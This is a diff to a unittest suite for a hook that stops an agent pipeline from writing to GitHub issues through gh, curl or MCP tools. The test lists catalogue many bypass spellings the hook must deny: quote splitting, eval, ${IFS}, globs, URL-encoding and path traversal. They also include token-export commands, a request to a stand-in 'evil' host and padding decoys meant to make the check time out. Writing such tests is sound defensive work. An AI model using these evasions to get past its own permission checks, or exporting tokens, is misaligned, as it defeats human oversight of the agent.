@@ -2,6 +2,7 @@ import random
 import re
 import time
 import unittest
+from unittest import mock
 
 from ppl import forges, trackers
 from ppl.errors import PplError
@@ -136,27 +137,40 @@ class GithubIssuesCase(unittest.TestCase):
             with self.subTest(command=command):
                 self.assertFalse(self.denied(command), command)
 
-    def assert_fast_and_clean(self, commands):
+    def assert_fast(self, commands, denied):
         # A hook that runs past its timeout denies nothing, so a command that makes
-        # a pattern backtrack is a bypass, not a slowdown.
+        # a check backtrack or recurse is a bypass, not a slowdown.
         for command in commands:
             with self.subTest(command=command[:40], length=len(command)):
                 start = time.perf_counter()
-                hits = [pattern.pattern[:60] for pattern in self.denials
-                        if pattern.search(command)]
+                hit = self.denied(command)
                 self.assertLess(time.perf_counter() - start, 0.2)
-                self.assertEqual(hits, [])
+                self.assertEqual(hit, denied)
+
+    def assert_fast_and_clean(self, commands):
+        self.assert_fast(commands, False)
 
 
 class TestGithubIssuesAdapter(GithubIssuesCase):
-    def test_the_adapter_writes_through_gh_and_holds_no_mcp_tool(self):
+    def test_the_adapter_writes_through_gh_and_reads_no_mcp_tool(self):
         self.assertEqual(self.adapter.TRANSPORT, "cli")
         self.assertEqual(self.adapter.DEFAULTS, {"task_prefix": "GH"})
         self.assertEqual(self.adapter.KEYS, ("kind", "repo", "task_prefix"))
         self.assertEqual(self.adapter.mcp_read_tools(github_issues_table()), [])
+
+    def test_the_github_mcp_issue_writes_are_tracker_writes_under_any_server(self):
         pattern = self.adapter.mcp_write_regex(github_issues_table())
-        for name in ("", "mcp__github__add_issue_comment", "mcp__atlassian__editJiraIssue",
-                     "Bash"):
+        for operation in ("create_issue", "update_issue", "add_issue_comment", "issue_write",
+                          "sub_issue_write", "add_sub_issue", "remove_sub_issue",
+                          "reprioritize_sub_issue", "assign_copilot_to_issue"):
+            for prefix in ("mcp__github__", "mcp__github_2__", "mcp__claude_ai_GitHub__",
+                           "mcp__corp-gh__"):
+                self.assertTrue(pattern.match(prefix + operation), prefix + operation)
+        for name in ("", "mcp__github__get_issue", "mcp__github__list_issues",
+                     "mcp__github__search_issues", "mcp__github__issue_read",
+                     "mcp__github__add_issue_comments", "github__add_issue_comment",
+                     "mcp__github__add_issue_comment\n", "mcp____add_issue_comment",
+                     "mcp__atlassian__editJiraIssue", "Bash"):
             self.assertFalse(pattern.match(name), name)
 
     def test_the_issue_number_is_the_digits_after_the_prefix(self):
@@ -226,7 +240,32 @@ class TestGithubIssuesWriteDenials(GithubIssuesCase):
              "gh api repos/o/r/issues/5", "gh api -X GET repos/o/r/issues -f state=open",
              "gh api repos/o/r/pulls/5/comments", 'gh pr comment 5 -b "the issue comment"',
              "gh api graphql -f query='query{repository(owner:\"o\",name:\"r\")"
-             "{issue(number:5){title}}}'"])
+             "{issue(number:5){title}}}'"]
+            # what the pipeline itself runs before the merge, filled in
+            + ["gh api graphql -f query='query { repository(owner: \"o\", name: \"r\") { "
+               "pullRequest(number: 7) { reviewThreads(first: 100) { nodes { isResolved "
+               "comments(first: 1) { nodes { databaseId } } } } } } }'",
+               "gh api graphql -f query='{viewer{login}}'",
+               "gh api graphql -f query='query($o:String!){repository(owner:$o,name:\"r\")"
+               "{issue(number:1){title}}}' -f o=x",
+               "gh api repos/o/r/pulls/7/comments/123/replies -f body='Fixed in abc123; "
+               "the | pipe & ampersand stay (quoted)'",
+               "gh api repos/o/r/pulls/7/comments/123/replies -f body=\"$(cat reply.md)\"",
+               "gh api repos/o/r/pulls/7/comments/123/replies -F body=@reply.md",
+               "gh api repos/o/r/pulls/7/comments/123/replies --input reply.json",
+               "gh api repos/{owner}/{repo}/pulls/7/comments/123/replies -f body='mentions "
+               "issues/5 and mutation addComment'",
+               "gh api repos/o/r/pulls/7/comments --paginate", "gh api repos/o/r/pulls/7/reviews",
+               "gh api user --jq .login", "gh pr checks 7",
+               "gh pr view 7 --json=reviews,headRefOid",
+               "gh pr create --title \"GH-12 fix the issue\" --body-file /tmp/body.md",
+               "gh auth status", "gh auth status --hostname github.com", "gh --version",
+               "gh version", "gh help issue", "gh alias list", "gh extension list",
+               "gh api https://api.github.com/repos/o/r/issues/5",
+               "curl https://api.github.com/repos/o/r/pulls/7", "curl https://api.github.com/user",
+               "xargs -I{} gh issue view {}", "{ gh issue view 5; }",
+               "gh pr comment 7 --body-file - <<'EOF'\nIt's done, see gh issue #5\nEOF",
+               "git commit -m \"it's the gh docs\""])
 
     def test_the_write_denials_stay_fast_on_backtracking_decoys(self):
         self.assert_fast_and_clean(["gh issue " + "--a 'x' " * 13 + "zzz; gh issue view 1",
@@ -253,7 +292,140 @@ class TestGithubIssuesWriteDenials(GithubIssuesCase):
              "gh issue $VERB 5", "gh issue ${VERB} 5", "gh issue -R $R view",
              "gh issue view `echo 5`", "gh issue view \"$(echo 5)\"", "gh issue $'\\x63lose' 5",
              "gh iss\\ue close 5", "gh \"is\"sue close 5", "gh $SUB close 5",
-             "gh $(echo issue) close 5"])
+             "gh $(echo issue) close 5",
+             # gh refuses these, the denial does not rely on that
+             "gh issue close5", "gh issue comment5 -b x", "gh issue CLOSE 5",
+             "gh issue 'close'' ' 5", "gh issue close\\ 5", "gh issue 'close 5'"])
+
+    def test_quotes_and_escapes_inside_a_word_are_removed_before_matching(self):
+        self.assert_denied(
+            ["gh api repos/o/r/is''sues/5/comments -f body=x",
+             "gh api repos/o/r/is\"\"sues/5/comments -f body=x",
+             "gh api repos/o/r/'issues'/5/comments -f body=x",
+             "gh api re''pos/o/r/issues/5/comments -f body=x",
+             "gh api repos/o/r/\\issues/5/comments -f body=x",
+             "gh api 'repos/o/r/iss'ues/5/comments -f body=x",
+             "gh api repos/o/r'/'issues/5/comments -f body=x",
+             "gh api repos/o/r/%69ssues/5/comments -f body=x",
+             "gh api repos%2Fo%2Fr%2Fissues/5/comments -f body=x",
+             "gh api graphql -f query='mutation{add''Comment(input:{}){clientMutationId}}'",
+             "gh api graphql -f query='mut''ation{addComment(input:{}){clientMutationId}}'",
+             "gh api graph''ql --input q.json", "gh api 'graph'ql --input q.json",
+             "gh api repos/o/r/issues/5/comments -\"f\" body=x",
+             "gh api repos/o/r/issues/5/comments -\\f body=x",
+             "gh api repos/o/r/issues/5/comments --fie\"ld\" body=x",
+             "gh api --meth\"od\" POST repos/o/r/issues/5", "gh api -\\X POST repos/o/r/issues/5",
+             "gh api -X P\"OST\" repos/o/r/issues/5", "gh api graphql --in\"put\" q.json",
+             "gh api graphql -\"F\" query=@m.graphql",
+             "g\"h\" issue close 5", "g''h issue close 5", "g\\h issue close 5",
+             "gh i\"ssue\" close 5", "gh issue 'clo'se 5", "gh issue \\c\\l\\o\\s\\e 5",
+             "gh issue \\\n close 5", "eval 'gh issue close 5'", "sh -c \"gh issue close 5\"",
+             "python3 -c \"import os; os.system('gh issue close 5')\"",
+             "G=gh; $G issue close 5", "\"$(which gh)\" issue close 5",
+             "gh${IFS}issue${IFS}close${IFS}5", "gh$IFS'issue' close 5", "GH issue close 5",
+             "/opt/homebrew/bin/GH issue close 5", "echo close 5 | xargs gh issue",
+             "echo -f body=x | xargs gh api repos/o/r/issues/5/comments",
+             "find . -exec gh issue {} \\;", "parallel gh issue ::: close", "xargs gh"])
+        self.assert_allowed(["xargs -I{} gh issue view {}", "echo 5 | xargs gh issue view",
+                             "echo $HOME | xargs ls", "ls gh*"])
+
+    def test_a_graphql_document_naming_an_issue_mutation_in_any_spelling_is_denied(self):
+        query = "gh api graphql -f query="
+        self.assert_denied(
+            [query + "'{addComment(input:{}){clientMutationId}}'",
+             query + "'MUTATION{addComment(input:{}){clientMutationId}}'",
+             query + "'mutation{AddComment(input:{}){clientMutationId}}'",
+             query + "'mutation{\\u0061ddComment(input:{}){clientMutationId}}'",
+             query + "'mutation{add#c\nComment(input:{}){clientMutationId}}'",
+             query + "\"mutation{add\\Comment(input:{}){clientMutationId}}\"",
+             query + "'mutation{add\"\"Comment(input:{}){clientMutationId}}'",
+             "gh api graphql -f query=@m.graphql", "gh api graphql -F query@=m",
+             "gh api graphql -F qu''ery=@m.graphql", "gh api graphql -iF query=@m.graphql",
+             "gh api graphql -F query=@m.graphql -H 'X: repos/o/r/pulls/1'",
+             "gh api GRAPHQL --input q.json", "gh api graphql/ --input q.json",
+             "gh api api.github.com/graphql --input q.json"])
+
+    def test_flag_spellings_gh_refuses_are_still_read_as_the_flag(self):
+        # gh rejects these, the denial does not rely on that
+        self.assert_denied(["gh api --metho POST repos/o/r/issues/5",
+                            "gh api repos/o/r/issues/5/comments --fiel body=x",
+                            "gh api repos/o/r/issues/5/comments --raw-f body=x",
+                            "gh api repos/o/r/issues/5/comments --inp n.json",
+                            "gh api repos/o/r/issues/5/comments -pf body=x",
+                            "gh api repos/o/r/issues/5/comments -sf body=x"])
+
+    def test_a_glob_or_brace_expansion_in_a_gh_call_is_unreadable_and_denied(self):
+        self.assert_denied(
+            ["gh issue {--repo=o/r,close} 5", "gh issue {-Ro/r,comment} 5 -b x",
+             "gh {-Ro/r,issue} close 5", "gh issue {close,} 5",
+             "gh api {-Hx:,repos/o/r/iss}ues/5/comments -f body=x",
+             "gh api repos/o/r/issues/5/comments {-Hx:,-f} body=x",
+             "gh api graphql {-Hx:,-F} query=@m.graphql", "gh api graphql -F{x=1,query=@m.graphql}",
+             "gh api -X{GET,POST} repos/o/r/issues/5/comments -f body=x",
+             "touch close; gh issue clos? 5", "gh issue c[l]ose 5", "gh issue clo* 5",
+             "gh i[s]sue close 5", "gh api repos/o/r/issue{s,}/5/comments -f body=x",
+             "gh api repos/o/r/issue[s]/5/comments -f body=x", "gh pr view {7,8}",
+             "gh api repos/o/r/issu*/5/comments -f body=x", "gh issue {1..3} close"])
+        self.assert_allowed(["gh api repos/{owner}/{repo}/pulls/7/comments --paginate",
+                             "gh api graphql -f query='{viewer{login}}'",
+                             "gh api user --jq '.[0]'", "gh issue view 5 --jq '.title,.body'"])
+
+    def test_an_alias_an_extension_or_a_subcommand_gh_does_not_ship_is_denied(self):
+        self.assert_denied(
+            ["gh alias set ic 'issue comment'", "gh alias import aliases.yml",
+             "gh alias set --clobber ic 'issue comment'", "gh extension install o/gh-x",
+             "gh ext install o/gh-x", "gh extensions exec x", "gh extension exec x --flag",
+             "gh ic 5 -b x", "gh co 7", "gh ISSUE close 5", "gh -R o/r zzz",
+             "gh copilot -p 'comment on issue 5'", "if gh ic 5; then :; fi", "X=1 gh ic 5",
+             "env X=1 gh ic 5", "sudo -u x gh co 7", "timeout 5 gh ic 5",
+             "echo 5 | xargs -n1 gh ic", "bash -c 'gh ic 5 -b x'", "gh pr view {7,8}"])
+        # a gh that is no program, only a word another command reads
+        self.assert_allowed(["grep -rn gh .", "rg gh src", "grep gh *.py", "mkdir gh docs",
+                             "cp /opt/homebrew/bin/gh /tmp/", "echo gh foo", "echo gh${IFS}a",
+                             "git log --grep gh -- docs"])
+        self.assertIn("issue", self.adapter.BUILTINS)
+        self.assertNotIn("co", self.adapter.BUILTINS)
+        self.assertEqual(self.adapter.GH_VERSION, "2.92.0")
+
+    def test_a_token_export_or_another_client_naming_an_issues_endpoint_is_denied(self):
+        self.assert_denied(
+            ["gh auth token", "gh auth token --hostname github.com", "gh auth status -t",
+             "gh auth status --show-token", "gh auth status -at",
+             "gh auth status -h github.com --show-token",
+             "curl -X POST https://api.github.com/repos/o/r/issues/5/comments -d '{}'",
+             "curl https://api.github.com/repos/o/r/issues/5",
+             "wget --post-data x https://api.github.com/repos/o/r/issues/5/comments",
+             "http POST api.github.com/repos/o/r/issues/5/comments body=x",
+             "python3 -c \"import urllib.request as u; "
+             "u.urlopen('https://api.github.com/repos/o/r/issues/5/comments', b'{}')\"",
+             "curl https://ghe.example/api/v3/repos/o/r/issues/5/comments -d x",
+             "curl -X POST https://api.github.com/graphql -d @q.json",
+             "curl https://ghe.example/api/graphql -d x",
+             "curl \"https://api.github.com/repos/o/r/iss\"\"ues/5/comments\" -d x",
+             "curl https://api.github.com/repositories/1/issues/5/comments -d x",
+             "curl https://api.github.com/repos/o/r/pulls/7/../../issues/5/comments -d x",
+             "curl https://api.github.com/repos/o/r/%69ssues/5/comments -d x"])
+
+    def test_a_blank_bash_does_not_split_on_is_part_of_the_word(self):
+        # bash splits on space, tab and newline only, so these stay inside the word
+        self.assert_allowed(["gh pr view 7\xa0", "echo a\x0cb", "echo  x",
+                             "gh\x0bissue close 5"])
+        self.assert_denied(["gh issue close\xa05", "gh issue comment 5 -b \xa0x\x0b"])
+
+    def test_a_defect_in_the_check_denies_a_command_naming_gh_instead_of_raising(self):
+        with mock.patch.object(self.adapter, "_check_text", side_effect=RuntimeError("defect")):
+            self.assertTrue(self.denied("gh issue close 5"))
+            self.assertTrue(self.denied("curl https://api.github.com/graphql -d x"))
+            self.assertFalse(self.denied("ls -la"))
+
+    def test_a_command_the_shell_cannot_split_denies_when_it_could_reach_gh(self):
+        self.assert_denied(["gh issue close 5 'unterminated", "echo \"x; gh issue close 5",
+                            "gh issue view $(echo 5", "gh issue view `echo 5",
+                            "g\"h issue close 5", "curl https://api.github.com/graphql 'x",
+                            "bash <<'EOF'\ngh issue close 5\nEOF",
+                            "bash <<'EOF'\necho it's\ngh issue close 5\nEOF",
+                            "case x in x) gh issue close 5;; esac"])
+        self.assert_allowed(["echo 'unterminated", "echo \"it's ok"])
 
     def test_a_rest_issue_write_is_denied_however_the_route_and_method_are_spelled(self):
         self.assert_denied(
@@ -291,7 +463,6 @@ class TestGithubIssuesWriteDenials(GithubIssuesCase):
              "gh api repos/o/r/pulls/7/comments/1/replies -f body='see "
              "https://github.com/o/r/issues/12'",
              "gh api repos/o/r/pulls/7/comments/1/replies -f body=\"$(cat reply.md)\"",
-             "gh api repos/$REPO/pulls/$N/comments --paginate",
              "gh api user --jq .login",
              "gh api repos/o/r/pulls/7/reviews -f event=COMMENT"])
 
@@ -325,10 +496,23 @@ class TestGithubIssuesWriteDenials(GithubIssuesCase):
                             "gh api \"repos/o/r/${KIND}/5/comments\" -f body=x",
                             "gh api `cat endpoint` --input body.json",
                             "gh api repos/o/r/commits/$SHA --input <(echo x)"])
-        self.assert_allowed(["gh api repos/o/r/pulls/$N/comments",
-                             "gh api \"repos/$OWNER/$REPO/pulls/7/reviews\"",
-                             "gh api repos/o/r/issues/5 --jq '.body | $x'",
+        self.assert_allowed(["gh api repos/o/r/issues/5 --jq '.body | $x'",
                              "gh api user --jq '.login'"])
+
+    def test_the_pulls_exception_needs_a_literal_route_and_no_word_an_expansion_can_add(self):
+        self.assert_denied(
+            ["gh api repos/o/r/pulls/7/../../$K/5/comments -f body=x",
+             "gh api repos/o/r/pulls/7/../../iss$E/5/comments -f body=x",
+             "gh api repos/o/r/pulls/./7/comments/1/replies -f body=\"$(cat r)\"",
+             "gh api repos/o/r/pulls/%2e%2e/x/comments -f body=\"$(cat r)\"",
+             "gh api repos/o/r/pulls/$N/comments", "gh api \"repos/$OWNER/$REPO/pulls/7/reviews\"",
+             "gh api repos/$REPO/pulls/$N/comments --paginate", "gh api repos/o/r/pulls/1 $EXTRA",
+             "gh api https://evil/repos/o/r/pulls/1 -f body=$X",
+             "gh api $ROUTE -f body=x repos/o/r/pulls/1",
+             "gh api graphql -f query=\"$Q\" repos/o/r/pulls/1/",
+             "gh api repos/o/r/pulls/1/comments/2/replies -f body=\"$(cat r)\" "
+             "$(echo --hostname x)",
+             "gh api repos/o/r/issues/5/comments -f body=\"$(cat x)\" -H 'X: repos/o/r/pulls/1'"])
 
     def test_the_github_forge_fragment_commands_pass_the_tracker_denials(self):
         # The review loop runs before the merge is observed, so a denial here
@@ -337,7 +521,12 @@ class TestGithubIssuesWriteDenials(GithubIssuesCase):
         spans = [span for name in ("stage6", "stage7", "review-loop")
                  for span in re.findall(r"`(gh [^`]+)`", github.fragment(name))]
         self.assertTrue(spans)
-        self.assert_allowed(spans)
+        forbidden = {"gh pr review --approve", "gh pr merge"}
+        values = {"<owner>": "o", "<repo>": "r", "<number>": "7", "<id>": "123",
+                  "<text>": "'Fixed in abc123, see the issue: done; thanks'",
+                  "<TASK-ID>": "GH-12", "<summary>": "fix the issue view", "<file>": "/tmp/b.md"}
+        filled = [re.sub(r"<[A-Za-z-]+>", lambda m: values[m.group(0)], span) for span in spans]
+        self.assert_allowed(spans + [span for span in filled if span not in forbidden])
 
     def test_prose_naming_gh_issue_is_not_a_write(self):
         self.assert_allowed(
@@ -351,15 +540,23 @@ class TestGithubIssuesWriteDenials(GithubIssuesCase):
              "gh issue view 5; echo $HOME", "gh issue view 5 2>&1"])
 
     def test_the_write_denials_stay_fast_on_padded_commands(self):
+        # 4 KB, the role command cap
         self.assert_fast_and_clean(
-            ["gh api " * 585, "gh issue " * 455, "gh " * 1365, "gh api r " * 455,
-             "gh api - " * 455, "gh api 'r' " * 370, "gh api \"-\" " * 370,
-             "gh api -X POST " * 270, "gh api mutation " * 250, "gh api graphql " * 270,
-             "gh api -f x " * 340, "gh api m a c d r u " * 200, "gh api repos/" + "repos/" * 680,
-             "gh api " + "repos/x/" * 500, "gh api -f '" + "a" * 4000 + "'",
-             "gh api \"" + "x" * 4000, "gh -R" + " " * 4000 + "x",
+            ["gh api -X POST" + " x" * 2000, "gh api -f x" + " -f y" * 800,
+             "gh api repos/" + "repos/" * 680, "gh api " + "repos/x/" * 500,
+             "gh api -f '" + "a" * 4000 + "'", "gh -R" + " " * 4000 + "x",
              "gh issue -R" + " " * 4000 + "x", "gh issue " + "-a b " * 800 + "view",
-             "gh api repos/o/r/issues " + "-X GET " * 600])
+             "gh api repos/o/r/issues " + "-X GET " * 600, "echo " + "'gh a' " * 580,
+             "echo " + "\"$(true)\" " * 450, "echo " + "x" * 4000, "true;" * 800,
+             "echo " + "a\\ " * 1300, "cat <<E\n" + "x\n" * 2000 + "E",
+             "echo " + "$(" * 1000 + ")" * 1000, "echo " + "'a b gh c' " * 400,
+             "gh api graphql -f query='query{" + "a{" * 1000 + "}" * 1000 + "}'",
+             "curl " + "https://api.github.com/x " * 160, "echo " + "`" * 4000])
+        # a command naming gh this many times is no command the pipeline runs, and
+        # a gh command the shell cannot split is denied
+        self.assert_fast(["gh api " * 585, "gh issue " * 455, "gh " * 1365, "gh api r " * 455,
+                          "gh api - " * 455, "gh api 'r' " * 370, "gh api \"-\" " * 370,
+                          "gh api \"" + "x" * 4000, "echo \"" + "$(gh " * 600 + "\""], True)
 
 
 class TestWriteToolRegex(unittest.TestCase):
